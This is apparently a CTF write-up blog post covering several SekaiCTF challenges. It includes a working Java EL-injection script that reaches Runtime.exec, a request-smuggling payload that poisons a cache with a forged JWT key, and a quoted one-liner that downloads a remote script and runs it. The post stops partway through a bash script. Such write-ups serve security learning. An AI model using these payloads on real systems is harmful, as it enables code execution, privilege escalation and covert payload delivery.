+<p>对于这一题，需要就是进行EL表达式的构造，可以通过其他的方式进行任意字符的构造，首先是数字</p>
+<p>（转载大佬脚本）</p>
+<p>因为存在message，所以构造思路上就是使用equal</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message.equals(message)</span><br></pre></td></tr></table></figure>
+<p>相等之后返回1，然后使用compareTo，相当于1.compareTo(1)，返回0</p>
+<p>同理0的构造就是将1.compareTo(1)变为1.compareTo(0)，</p>
+<p>也就构造出了<code>message.equals(message.hashCode())</code>，这句话会返回0</p>
+<p>构造出0和1之后就需要考虑如何构造出任意数字</p>
+<p>前置：</p>
+<p><code>message.length()</code>返回的是一个Integer，然后在这个类下面存在sum函数，就可以使用不断的嵌套进行对1的累加。</p>
+<p>相当于</p>
+<p><code>1+(1+(1+1))</code>如此不断重复</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_int</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;message.equals(message).compareTo(message.equals(message))&quot;</span></span><br><span class="line">    target = i</span><br><span class="line"></span><br><span class="line">    one = <span class="string">&quot;message.equals(message).compareTo(message.equals(message.hashCode()))&quot;</span></span><br><span class="line">    curr = one</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target - <span class="number">1</span>):</span><br><span class="line">        curr = <span class="string">f&quot;message.length().sum(<span class="subst">&#123;one&#125;</span>, <span class="subst">&#123;curr&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> curr</span><br></pre></td></tr></table></figure>
+<h4 id="任意字符构造">任意字符构造</h4>
+<p>对于这个任意字符构造，使用的是反射机制，在此就不多解释了</p>
+<p>第一步找到需要的函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">50</span>)</span>:</span><br><span class="line"></span><br><span class="line">    ii = get_int(i)</span><br><span class="line">    r = requests.post(<span class="string">&quot;http://127.0.0.1:1337/addContact&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: f<span class="string">&quot;$&#123;&#123;message.getClass().getMethods()[&#123;ii&#125;]&#125;&#125;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text,i)</span><br></pre></td></tr></table></figure>
+<p>然后所需要构造的链子是<code>String.charAt(0).toChars(i)[0].toString()</code>，第一个函数的调用返回一个char类型，其类为Character，然后通过反射调用其存在的方法<code>toChars</code>，然后就可以调用ascii码进行任意字符的构造了，需要加上toString将其转为字符串。因为时候方法的构造需要</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_chr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="comment"># charAt - 22</span></span><br><span class="line">    <span class="comment"># toChars - 39</span></span><br><span class="line">    <span class="comment"># String.charAt(0).toChars(i)[0].toString()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">22</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>).getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">39</span>)&#125;</span>].invoke(message,<span class="subst">&#123;get_int(i)&#125;</span>)[<span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>].toString()&quot;</span></span><br></pre></td></tr></table></figure>
+<p>最后获得任意字符串的构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">get_str</span><span class="params">(s)</span>:</span><br><span class="line">    res = get_chr(ord(s[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>, len(s)</span>):</span><br><span class="line">        res += f<span class="string">&quot;.concat(&#123;get_chr(ord(s[i]))&#125;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+<h4 id="任意方法构造">任意方法构造</h4>
+<p>同样的，通过反射获取方法然后进行构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message.getClass().getClass().getMethods()[&#123;get_int(<span class="number">2</span>)&#125;].invoke(message, &#123;get_str(s)&#125;)message.getClass().getClass()</span><br></pre></td></tr></table></figure>
+<p>获取Class类，然后getMethod，获取forName然后，然后调用invoke得到相应的类即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_class</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">2</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_str(s)&#125;</span>)&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="payload">payload</h4>
+<p>最后我更改了一下整个的payload，不然有点难以理解，不如直接使用<code>.getInputStream().readAllBytes()[i]</code>截取字符即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    cmd = <span class="string">&quot;cat flag-f3d5d1137dc6a727ce3dfcfc45d163f5.txt&quot;</span></span><br><span class="line">    <span class="comment"># cmd = &quot;ls&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&quot;http://127.0.0.1:1337/addContact&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: <span class="string">f&quot;$&#123;&#123;<span class="subst">&#123;get_class(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)&#125;</span>.getMethods()[<span class="subst">&#123;get_int(<span class="number">6</span>)&#125;</span>].invoke(null).exec(<span class="subst">&#123;get_str(cmd)&#125;</span>).getInputStream().readAllBytes()[<span class="subst">&#123;get_int(i)&#125;</span>]&#125;&#125;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    data = r.json()</span><br><span class="line">    violations = data[<span class="string">&#x27;violations&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> violations:</span><br><span class="line">        <span class="keyword">if</span> v[<span class="string">&#x27;fieldName&#x27;</span>] == <span class="string">&#x27;country&#x27;</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">int</span>(v[<span class="string">&#x27;message&#x27;</span>].strip(<span class="string">&quot; is not a valid country&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+<p>最终exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_int</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;message.equals(message).compareTo(message.equals(message))&quot;</span></span><br><span class="line"></span><br><span class="line">    target = i</span><br><span class="line"></span><br><span class="line">    one = <span class="string">&quot;message.equals(message).compareTo(message.equals(message.hashCode()))&quot;</span></span><br><span class="line">    curr = one</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target - <span class="number">1</span>):</span><br><span class="line">        curr = <span class="string">f&quot;message.length().sum(<span class="subst">&#123;one&#125;</span>, <span class="subst">&#123;curr&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> curr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="comment"># charAt - 22</span></span><br><span class="line">    <span class="comment"># toChars - 39</span></span><br><span class="line">    <span class="comment"># String.charAt(0).toChars(i)[0].toString()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">22</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>).getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">39</span>)&#125;</span>].invoke(message,<span class="subst">&#123;get_int(i)&#125;</span>)[<span class="subst">&#123;get_int(<span class="number">0</span>)&#125;</span>].toString()&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">s</span>):</span><br><span class="line">    res = get_chr(<span class="built_in">ord</span>(s[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">        res += <span class="string">f&quot;.concat(<span class="subst">&#123;get_chr(<span class="built_in">ord</span>(s[i]))&#125;</span>)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_class</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># forName: 2</span></span><br><span class="line">    <span class="comment"># Class.forName(s)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;message.getClass().getClass().getMethods()[<span class="subst">&#123;get_int(<span class="number">2</span>)&#125;</span>].invoke(message, <span class="subst">&#123;get_str(s)&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    cmd = <span class="string">&quot;cat flag-f3d5d1137dc6a727ce3dfcfc45d163f5.txt&quot;</span></span><br><span class="line">    <span class="comment"># cmd = &quot;ls&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&quot;http://127.0.0.1:1337/addContact&quot;</span>, json=&#123;</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: <span class="string">f&quot;$&#123;&#123;<span class="subst">&#123;get_class(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)&#125;</span>.getMethods()[<span class="subst">&#123;get_int(<span class="number">6</span>)&#125;</span>].invoke(null).exec(<span class="subst">&#123;get_str(cmd)&#125;</span>).getInputStream().readAllBytes()[<span class="subst">&#123;get_int(i)&#125;</span>]&#125;&#125;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    data = r.json()</span><br><span class="line">    violations = data[<span class="string">&#x27;violations&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> violations:</span><br><span class="line">        <span class="keyword">if</span> v[<span class="string">&#x27;fieldName&#x27;</span>] == <span class="string">&#x27;country&#x27;</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">int</span>(v[<span class="string">&#x27;message&#x27;</span>].strip(<span class="string">&quot; is not a valid country&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+<h3 id="chunky">chunky</h3>
+<p>这题的话，大概的意思就是通过请求走私对缓存进行污染，首先就是先生成需要污染的密钥，然后通过缓存机制将key缓存到缓存端，然后通过缓存和后端服务器处理的不同然后伪造jwt获得admin</p>
+<p>ps：主要是go语言写的web服务，没看懂,所以只会重点学一下原理</p>
+<p>缓存服务在nginx中</p>
+<p>后端服务在python的逻辑中</p>
+<p>docker中设置环境变量<code>JWKS_URL_TEMPLATE=http://chunky.chals.sekai.team:8080/&#123;user_id&#125;/.well-known/jwks.json</code></p>
+<p>admin.py中有get_public_key_url，引用了上面的url，并且存在下面的逻辑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">authorize_request</span>(<span class="params">token, user_id</span>):</span><br><span class="line">    pubkey_url = get_public_key_url(user_id)</span><br><span class="line">    <span class="keyword">if</span> has_valid_alg(token) <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(</span><br><span class="line">            <span class="string">&quot;Invalid algorithm. Only &#123;valid_algo&#125; allowed!&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                valid_algo=valid_algo</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    pubkey = get_public_key(pubkey_url)</span><br><span class="line">    <span class="built_in">print</span>(pubkey, flush=<span class="literal">True</span>)</span><br><span class="line">    pubkey = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&#123;pubkey&#125;\n-----END PUBLIC KEY-----&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        pubkey=pubkey</span><br><span class="line">    ).encode()</span><br><span class="line">    decoded_token = jwt.decode(token, pubkey, algorithms=[<span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;user&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> decoded_token:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;user claim missing!&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> decoded_token[<span class="string">&quot;user&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<p>对jwt进行解码判断是否是admin</p>
+<p>cache.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cache <span class="keyword">struct</span> &#123;</span><br><span class="line">	data  <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span></span><br><span class="line">	mutex sync.RWMutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cache)</span></span> Get(key <span class="type">string</span>) (<span class="type">string</span>, <span class="type">bool</span>) &#123;</span><br><span class="line">	c.mutex.Lock()</span><br><span class="line">	value, ok := c.data[key]</span><br><span class="line">	c.mutex.Unlock()</span><br><span class="line">	<span class="keyword">return</span> value, ok</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cache)</span></span> Set(key, value <span class="type">string</span>) &#123;</span><br><span class="line">	c.mutex.Lock()</span><br><span class="line">	c.data[key] = value</span><br><span class="line">	c.mutex.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cache)</span></span> Clear() &#123;</span><br><span class="line">	c.mutex.Lock()</span><br><span class="line">	<span class="keyword">for</span> k := <span class="keyword">range</span> c.data &#123;</span><br><span class="line">		<span class="built_in">delete</span>(c.data, k)</span><br><span class="line">	&#125;</span><br><span class="line">	c.mutex.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>存在set方法将传入的数值存储，rcache.go存在部分黑名单，直接小写绕过就行了，并且使用了🔒防止了多线程的问题</p>
+<p>最终的做法就是构造一篇blog，将我们伪造的key放入title，获取user_id和post_id，然后通过go语言对缓存服务器以及后端服务器对报文的不同处理方式实现的逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /9HGPZXRCK426RTH38XTDWD3FHWLE76EH HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line">Content-Length: 99</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/0c201b0a-fe61-4a87-83ea-2a8cd18bb0a0 HTTP/1.1</span><br><span class="line">GET /d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/.well-known/jwks.json HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<p>缓存服务会认为申请的是<code>/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/.well-known/jwks.json</code>，因为根据的是Content-Length</p>
+<p>真正的后端服务会认为是<code>/post/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/0c201b0a-fe61-4a87-83ea-2a8cd18bb0a0 HTTP/1.1</code>，因为根据的是transfer-encoding: chunked，所以在同时申请这样的报文状态下面，会将后端服务申请得到的东西存储到<code>/d4fea7be-41b0-42f5-a1f5-8ed6830bfec7/.well-known/jwks.json</code>下面，访问user_public_key的url会发现是我们伪造的key，也就实现了缓存污染（但是实际产生的原因还要等到我学go之后再说，不过我猜测就是在访问的过程中执行了Get和Set的方法，和不同的判定方式然后导致了错误的缓存方式（就是http走私的原理），以及跟进程锁有关系，会将之前未放入的报文进行拼接，然后导致不同url之间的污染问题），也就是说申请的数据是后端服务器的，但是存储的地方是缓存服务器。</p>
+<p>后端逻辑根据chunked传输，遇到<code>\r\n</code>会停止，这就是为什么会识别成第一个</p>
+<p>这题考的还是报文的处理问题，算是我第一次玩，而且还是go语言，具体逻辑还是没完全看懂</p>
+<p>具体的解题脚本看官方文档就可</p>
+<h3 id="余下两题待定（不会X，后续要学一下）">余下两题待定（不会X，后续要学一下）</h3>
+<h2 id="PPC">PPC</h2>
+<h3 id="wiki-game">wiki_game</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dijkstra</span>(<span class="params">graph, start, end</span>):</span><br><span class="line">    distances = &#123;vertex: <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">for</span> vertex <span class="keyword">in</span> graph&#125;</span><br><span class="line">    distances[start] = <span class="number">0</span></span><br><span class="line">    priority_queue = [(<span class="number">0</span>, start)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> priority_queue:</span><br><span class="line">        current_distance, current_vertex = heapq.heappop(priority_queue)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_distance &gt; distances[current_vertex]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[current_vertex]:</span><br><span class="line">            distance = current_distance + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> distance &lt; distances[neighbor]:</span><br><span class="line">                distances[neighbor] = distance</span><br><span class="line">                heapq.heappush(priority_queue, (distance, neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> distances[end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取输入</span></span><br><span class="line">L = <span class="built_in">int</span>(<span class="built_in">input</span>().strip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">    n, m = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    graph = &#123;i: [] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        u, v = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">        graph[u].append(v)</span><br><span class="line"></span><br><span class="line">    start, end = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用 Dijkstra 算法</span></span><br><span class="line">    shortest_distance = dijkstra(graph, start, end)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="keyword">if</span> shortest_distance &lt;= <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;YES&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="RE">RE</h2>
+<h3 id="Azusawa’s-Gacha-World">Azusawa’s Gacha World</h3>
+<p>Unity游戏，直接AssetStudio游戏解包一把梭哈</p>
+<p>在解包的Sprite下找到flag.png</p>
+<p><img src="/img/flag.png" alt="flag" /></p>
+<h2 id="Forensics">Forensics</h2>
+<h3 id="Eval-Me">Eval Me</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals.sekai.team&quot;</span>, <span class="number">9000</span>,level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    s = r.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    res = <span class="built_in">str</span>(<span class="built_in">eval</span>(s[<span class="number">0</span>].decode()))</span><br><span class="line">    r.sendline(res.encode())</span><br></pre></td></tr></table></figure>
+<p>然后给了一句话</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;(curl -sL https://shorturl.at/fgjvU -o extract.sh &amp;&amp; chmod +x extract.sh &amp;&amp; bash extract.sh &amp;&amp; rm -f extract.sh)&gt;/dev/null 2&gt;&amp;1||true&quot;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>把他下载下来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FLAG=$(cat flag.txt)</span><br><span class="line"></span><br><span class="line">KEY=&#x27;s3k@1_v3ry_w0w&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46</span></span><br><span class="line">Asc() &#123; printf &#x27;%d&#x27; &quot;&#x27;$1&quot;; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 